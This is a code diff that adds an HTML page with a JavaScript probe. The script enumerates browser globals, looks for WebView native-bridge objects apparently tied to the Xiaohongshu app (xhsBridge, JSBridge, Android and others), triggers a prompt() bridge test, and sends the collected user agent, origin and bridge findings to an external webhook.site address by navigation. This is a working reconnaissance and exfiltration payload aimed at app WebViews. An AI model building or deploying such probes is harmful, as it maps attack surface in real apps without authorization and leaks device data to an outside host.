@@ -1,0 +1,20 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P4</title></head>
+<body style="font:18px monospace;padding:8px"><h3>P4 NAV</h3>
+<script>
+var HOOK='https://webhook.site/72535c91-4e20-4e6a-b2a2-cf7b68483bdd';
+var d={};
+try{d.ua=navigator.userAgent.slice(0,90);}catch(e){}
+try{d.origin=location.origin;}catch(e){}
+try{d.secure=window.isSecureContext;}catch(e){}
+var ks=[];try{ks=Object.keys(window);}catch(e){}
+d.n=ks.length;
+d.susp=ks.filter(function(k){return /xhs|bridge|inject|jsb|hybrid|horizon|xy[a-z]|native|jsinterface/i.test(k);}).slice(0,25);
+var cand=['xhsBridge','_xhsBridge','JSBridge','_bridge','XhsBridge','__xhs','hybridBridge','xyBridge','horizonBridge','webviewBridge','jsBridge','XhsHybrid','XhsNative','nativeBridge','jsInterface','Android','_Android','webkit','ReactNativeWebView','__fbBatchedBridge'];
+var t={};
+cand.forEach(function(k){var v='u';try{v=typeof window[k];}catch(e){};if(v!=='undefined'&&v!=='u')t[k]=v;});
+d.cand=t;
+try{ d.promptRet=String(prompt('xhsbridge-probe')).slice(0,100); }catch(e){ d.promptErr=String(e).slice(0,60); }
+// 最后手段：直接导航
+location.href = HOOK + '?tag=nav&d=' + encodeURIComponent(JSON.stringify(d).slice(0,1600));
+</script>
+</body></html>
